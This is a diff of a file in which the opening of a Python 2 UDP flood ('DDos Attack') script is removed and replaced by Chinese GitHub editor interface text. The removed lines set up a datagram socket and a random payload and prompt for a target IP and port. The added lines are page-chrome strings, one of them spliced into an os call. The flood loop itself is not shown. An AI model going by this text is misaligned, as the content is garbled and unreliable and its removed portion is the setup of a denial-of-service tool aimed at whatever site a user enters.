@@ -1,39 +1,39 @@
-# python2
+面包屑
 
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+面包屑
+在
+主要的
+取消更改
+提交更改。
+编辑
+预演
+使用 GitHub在你身边55％
+缩进模式
+空
+制表符
+缩进尺寸
+换行模式
 
 ##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+无包裹
+软包
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print " "
-print "/---------------------------------------------------\ "
-print "|   作者          :    wycnb666"
-print "|   软件开源     |"
-print "|    作者微信 :       AA1116366       |"
-print "|   版本        : V1.0.0                        |"
-print "\---------------------------------------------------/"
-print " "
-print " ---------[Do not use for illegal purposes]--------- "
-print " "
-ip = raw_input("网站ip     : ")
-port = int(input("端口  : "))
-sd = int(input("数值(1~1000) : "))
+os.移动到页面上的下一个交互元素。("clear")
+通过
+拖拽，
+选择或粘贴它们。
+上传你的文件……
+我们不支持这种文件类型。
+再试一次
+有
+GIF、JPEG、JPG、MOV、MP4、PNG、SVG或 WEBM
+附加文档需要对此存储库的写权限。
+再试一次
+有
+GIF、JPEG、JPG、MOV、MP4、PNG、SVG或 WEBM
+我们不支持这种文件类型。
+再试一次
 
 os.system("clear")
 
